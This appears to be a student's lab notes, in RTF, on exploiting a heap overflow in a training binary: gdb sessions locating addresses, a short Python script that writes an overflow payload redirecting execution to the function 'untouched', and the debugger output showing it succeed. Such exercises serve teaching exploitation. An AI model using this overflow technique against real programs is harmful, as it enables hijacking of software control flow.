{\rtf1\ansi\ansicpg1252\cocoartf2513
\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\fswiss\fcharset0 Helvetica;}
{\colortbl;\red255\green255\blue255;}
{\*\expandedcolortbl;;}
\margl1440\margr1440\vieww27760\viewh16580\viewkind0
\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0

\f0\fs24 \cf0 Finding function and buffer address:\
\
$ gdb heap-64\
\
(gdb) break do_echo\
\
(gdb) run < bad\
\
(gdb) disas\
\
(gdb) info functions\
0x0000000000400970  frame_dummy\
0x00000000004009ae  untouched\
0x00000000004009c1  do_echo\
0x0000000000400a25  main\
0x0000000000400af0  generic_start_main\
\
(gdb) x/128bx $rsp\
0x7fffffffe698:	0xb0	0x0a	0x40	0x00	0x00	0x00	0x00	0x00\
0x7fffffffe6a0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41\
\
(gdb) x/128bx $rsp\
0x7fffffffe690:	0x18	0xb0	0x6c	0x00	0x00	0x00	0x00	0x00\
0x7fffffffe698:	0xb0	0x0a	0x40	0x00	0x00	0x00	0x00	0x00\
0x7fffffffe6a0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41\
\
\'97\'97\'97\'97\
\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
\cf0 \
Writing heap overflow exploit:\
\
heapsf1.py:\
\
#!/usr/bin/env python3\
\
import sys\
\
\
oflow = b'A' * 162 #+ b'BBBBCCCCDDDD' # number of As that will overflow the buffer, replace 123\
\
retaddr = 0x7fffffffe698 # rsp at function enter, in hex\
\
faddr = 0x4009ae # function you want to call, in hex\
\
exploit = bytearray(oflow)\
exploit.extend(retaddr.to_bytes(8, byteorder='little'))\
exploit.extend(faddr.to_bytes(8, byteorder='little'))\
exploit.extend(b'\\n')\
sys.stdout.buffer.write(exploit)\
\
\'97\'97\'97\'97\
\
\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
\cf0 Running exploit:\
\
\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
\cf0 $ python3 heapsf1.py > bad\
\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
\cf0 \
(gdb) disas\
Dump of assembler code for function do_echo:\
=> 0x00000000004009c1 <+0>:	sub    $0x8,%rsp\
0x0000000000400a09 <+72>:	callq  0x410130 <puts>\
\
(gdb) si\
0x0000000000400a24 in do_echo ()\
\
(gdb) info registers\
rax            0x4009ae	4196782\
rbx            0x6d0940	7145792\
rcx            0x43fc90	4455568\
rdx            0x7fffffffe698	140737488348824\
\
(gdb) x/128bx $rsp\
0x7fffffffe698:	0xae	0x09	0x40	0x00	0x00	0x00	0x00	0x00\
0x7fffffffe6a0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41\
\
(gdb) si\
0x00000000004009ae in untouched ()\
(gdb) c\
Continuing.\
You shouldn't be here.\
\
Program received signal SIGSEGV, Segmentation fault.\
0x00000000004009c0 in untouched ()}